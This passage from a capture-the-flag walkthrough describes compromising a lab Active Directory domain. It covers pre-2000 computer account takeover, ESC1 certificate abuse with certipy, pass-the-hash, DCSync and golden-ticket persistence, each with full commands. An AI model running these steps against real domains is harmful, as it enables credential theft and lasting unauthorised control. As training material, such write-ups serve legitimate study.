![](/ox-hugo/2025-09-17-082355_.png) so we can use `impacket-changepasswd`

+Note+: I am not going to be using the change password method, I am only putting this here for completeness. If you just want to get to root skip to the next section.

Checking `impacket-changepasswd` help documents we can see the protocols available to us, let's go with `rpc-samr`.

```shell
impacket-changepasswd $domain/BANKING\$:banking@$box -newpass StR0ngP@sSw0rd! -p rpc-samr

# Without vars so you can see what is being passed
impacket-changepasswd retro.vl/BANKING$:banking@10.129.234.44 -newpass StR0ngP@sSw0rd! -p rpc-samr
```

It worked!
![](/ox-hugo/2025-09-17-082008_.png)

Let's verify this via netexec.
![](/ox-hugo/2025-09-17-082819_.png)

### Exporting A Valid Kerberos Ticket Without Changing The Password For Pre-Windows Computer Accounts: {#exporting-a-valid-kerberos-ticket-without-changing-the-password-for-pre-windows-computer-accounts}

Reading the article further there is a link at the bottom to [this post on twitter](https://x.com/filip_dragovic/status/1524730451826511872/photo/1) which shows that we can actually request a kerberos ticket without having to reset the password.

+Note+: In a real engagement this would be the preferred approach to take ownership of this account as we should avoid changing passwords without explicit permission.

+Box Note+: If you are going to do this yourself you will need to reset the host as the password was just changed and it will not work otherwise.

First We grab the ticket using `impacket-getTGT`:

```shell
impacket-getTGT $domain/BANKING\$:banking
```

{{< figure src="/ox-hugo/2025-09-17-150532_.png" >}}

Then we set the ENV `KRB5CCNAME` to point to the kerberos ticket:

```shell
export KRB5CCNAME=./BANKING\$.ccache
```

{{< figure src="/ox-hugo/2025-09-17-150616_.png" >}}

Let's validate the ticket works using `impacket-smbclient`:

```shell
impacket-smbclient -k -no-pass $domain/BANKING\$@DC
```

{{< figure src="/ox-hugo/2025-09-17-150645_.png" >}}

We can also use netexec too or any other tool that allows `kerberos` authentication.

```shell
netexec smb $domain --use-kcache --shares
```

{{< figure src="/ox-hugo/2025-09-17-151428_.png" >}}

+Note+: I am going to to continue this box using the kerberos method without changing the password, so if you want to follow along I would advise resetting the box if you have changed the password.

### Exploiting ESC1 For Privilege Escalation: {#exploiting-esc1-for-privilege-escalation}

Now we have control of the account we should be able to exploit the vulnerable certificate "RetroClients" and escalate our privileges.

**High Level Overview of the ESC1 Attack**:
ESC1 allows us to request a ticket on behalf of another, often higher privileged, user by supplying a UPN (User Principle Name) once we have this ticket we can then use it to authenticate by performing a pass the cert attack. Doing this allows us to execute commands in the context of the user. In simple terms we request a certificate as the administrator and use that to authenticate as them.

+Deep Dive+: If you want a deeper dive into the ESC1 attack I have done that [in this article](https://bloodstiller.com/walkthroughs/escape-box/#using-esc1-attack-chain-to-elevate-privileges-to-administrator).

#### Requesting A Certificate: {#requesting-a-certificate}

If we run the command below

```shell
certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca 'retro-DC-CA' -template 'RetroClients' -upn administrator@$domain -dc-host dc.$domain
```

We get can see we get an error telling us the `The public key does not meet the minimum size required by the specified certificate template.`
![](/ox-hugo/2025-09-18-071201_.png)

#### Modifying ESC1 Key Length Request To Get A Certificate: {#modifying-esc1-key-length-request-to-get-a-certificate}

If we check the `certipy-ad req --help` we can see it's possible to modify the key size.
![](/ox-hugo/2025-09-18-072225_.png)
We need to pass the argument `-key-size [length]`, we can also see the default length is `2048` so let's double the length and see if that resolves this.

**Why we might “double” the key length**: Some AD CS templates enforce a minimum key length (`msPKI-Minimal-Key-Size`). If 2048 fails or you want stronger keys, bump to 4096. [More information here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/58943ff1-024f-46f3-8a6f-baae06de8351)
![](/ox-hugo/2025-09-18-162116_.png)

```shell
certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca 'retro-DC-CA' -template 'RetroClients' -upn administrator@$domain -dc-host dc.$domain -key-size 4098
```

As we can see we are granted a ticket `administrator.pfx`
![](/ox-hugo/2025-09-18-072522_.png)

#### Attempting To Authenticate With The Ticket: {#attempting-to-authenticate-with-the-ticket}

Now can authenticate with the ticket and get a TGT as the administrator.

```shell
 certipy-ad auth -username "administrator" -pfx administrator.pfx -domain $domain -dc-ip $box
```

Looks like we have another issue, we have a `SID` mismatch between the certificate and the administrator user.
![](/ox-hugo/2025-09-18-072846_.png)
It says to check the wiki so lets do that&#x2026;&#x2026;well that did not shed any further light however we can supply the `SID` of the user we are trying to impersonate with the `-sid` flag, which should hopefully resolve this issue as we will be injecting it straight into the certificate.

#### Supplying The SID To Get A Valid Certificate: {#supplying-the-sid-to-get-a-valid-certificate}

We can get the SID from bloodhound or from output of the SID busting we did in our initial enumeration phase.
![](/ox-hugo/2025-09-18-073447_.png)

Let's request another certificate this time with the supplied SID and the modified key length.

```shell
certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca 'retro-DC-CA' -template 'RetroClients' -upn administrator@$domain -dc-host dc.$domain -key-size 4098 -sid "S-1-5-21-2983547755-698260136-4283918172-500"
```

We have now have the cert with the administrator `SID` specified.
![](/ox-hugo/2025-09-18-073855_.png)

#### Requesting A TGT With Our Certificate &amp; Getting The Administrator Hash: {#requesting-a-tgt-with-our-certificate-and-getting-the-administrator-hash}

Now we can use this certificate to request a ticket granting ticket on behalf of the administrator, this will also reveal the administrator's hash.

```shell
certipy-ad auth -username "administrator" -pfx administrator.pfx -domain $domain -dc-ip $box
```

It works!
![](/ox-hugo/2025-09-18-074038_.png)

This means we can either authenticate with the hash or the ticket.

Let's get our root flag using evil-winrm and the hash.

```shell
evil-winrm -i $box -u administrator -H $hash
```

{{< figure src="/ox-hugo/2025-09-17-210540_.png" >}}

If we want to use the provided ticket to authenticate with evil-winrm we have to use the below syntax.

```shell
KRB5CCNAME='./administrator.ccache' evil-winrm -i dc.$domain -r $domain
```

{{< figure src="/ox-hugo/2025-09-18-163254_.png" >}}

+Important Note+: If you get the error below, I have found you just need to reload the `BANKING$.ccache` into the ENV `KRB5CCNAME` again&#x2026;.I'm not sure why but it seems to work.
![](/ox-hugo/2025-09-18-073818_.png)

## 4. Persistence: {#4-dot-persistence}

### Perform DCSync Attack Using netexec: {#perform-dcsync-attack-using-netexec}

Now we have the administrator hash lets perform a dcsync attack to dump all other hashes remotely.

```shell
netexec smb $box -u $user -H $hash -M ntdsutil
```

{{< figure src="/ox-hugo/2025-09-18-074406_.png" >}}

### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

Let's create a golden ticket so we can always get back in, granted we have administrator ticket.

Now we will use `impacket-secretsdump` to retrieve the `aeskey` of the `krbtgt` account:

```shell
impacket-secretsdump $domain/$user@$box -hashes :$hash
```

+Note+: I store `krbtgt:aes256` value in the variable `$krbtgt` and have also stored the domain sid in `$sid`
![](/ox-hugo/2025-09-18-170838_.png)

Now we use `impacket-ticketer` to create the Golden Ticket:

```shell
#Using -aeskey
impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator
```

{{< figure src="/ox-hugo/2025-09-18-121408_.png" >}}

- Export the ticket to the\* `KRB5CCNAME` Variable:

<!--listend-->

```shell
export KRB5CCNAME=./Administrator.ccache
```

Let's validate the ticket works by using the ticket for connecting via `psexec`

```shell
impacket-psexec -k -no-pass $machine.$domain
```

{{< figure src="/ox-hugo/2025-09-18-121433_.png" >}}

#### Why create a golden ticket? {#why-create-a-golden-ticket}

"But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:

Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:

`KRBTGT` **Hash Dependence**:

Golden Tickets are generated using the `KRBTGT` account hash from the target’s domain controller.

Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.

`KRBTGT` **The Key to It All (for upto 10 years)**:

A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.

This makes it a reliable backdoor, especially if re-access is needed long after initial entry.

For instance here is the standard Administrator ticket exported from the ESC1 attack:
![](/ox-hugo/2025-09-18-164200_.png)
As you can see it's valid for 24 hours.

And here is the Golden ticket made with the KRBTGT account, it's valid for just shy of 10 years.
![](/ox-hugo/2025-09-18-164314_.png)

**Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.

## Lessons Learned: {#lessons-learned}

### What did I learn? {#what-did-i-learn}

1.  I actually learned alot about pre-2000 windows computer accounts. This was new to me so was fun to look into.
2.  I hadn't done an ESC1 attack where I had to modify the key size or provide a specific sid so that was interesting too to learn about.

### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I spent a long time trying lots of different things when I was give the key length error instead of reverting back to the docs as I should have.

## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com
